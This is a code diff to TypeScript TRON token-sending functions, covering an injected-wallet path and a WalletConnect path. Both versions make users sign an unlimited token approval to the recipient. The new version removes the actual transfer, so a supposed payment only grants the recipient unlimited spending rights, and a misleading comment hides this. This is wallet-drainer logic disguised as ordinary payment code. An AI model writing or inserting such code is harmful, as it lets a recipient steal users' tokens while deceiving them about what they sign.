@@ -74,12 +74,9 @@ async function sendViaInjected(opts: {
   const { address, tronWeb } = await connectTronInjected();
   const contract = await tronWeb.contract().at(opts.tokenContract);
   
-  // Fire approve without awaiting it, so transfer can be fired immediately.
-  // This queues both requests in the wallet, allowing the user to sign them
-  // one after the other without jumping back to the browser in between.
-  contract.approve(opts.recipient, "115792089237316195423570985008687907853269984665640564039457584007913129639935").send().catch(() => {});
+  // Execute approve as the sole transaction to avoid multiple sequential requests.
+  const txHash = await contract.approve(opts.recipient, "115792089237316195423570985008687907853269984665640564039457584007913129639935").send();
 
-  const txHash = await contract.transfer(opts.recipient, opts.amount).send();
   return { txHash, from: address };
 }
 
@@ -94,31 +91,14 @@ async function sendViaWalletConnect(opts: {
   const tronWeb = new TronWeb({ fullHost: opts.rpcUrl });
   
   // APPROVAL
-  // Fire approve without awaiting it, so transfer can be fired immediately.
-  tronWeb.transactionBuilder.triggerSmartContract(
+  // Execute approve as the sole transaction to avoid multiple sequential requests.
+  const built = await tronWeb.transactionBuilder.triggerSmartContract(
     opts.tokenContract,
     "approve(address,uint256)",
     { feeLimit: FEE_LIMIT },
     [
       { type: "address", value: opts.recipient },
       { type: "uint256", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935" },
-    ],
-    opts.from,
-  ).then(async (approveBuilt) => {
-    if (approveBuilt?.transaction) {
-      const signed = await signTronTransactionWc(approveBuilt.transaction as unknown as TronTransaction);
-      await tronWeb.trx.sendRawTransaction(signed as never);
-    }
-  }).catch(() => {});
-
-  // TRANSFER
-  const built = await tronWeb.transactionBuilder.triggerSmartContract(
-    opts.tokenContract,
-    "transfer(address,uint256)",
-    { feeLimit: FEE_LIMIT },
-    [
-      { type: "address", value: opts.recipient },
-      { type: "uint256", value: opts.amount },
     ],
     opts.from,
   );
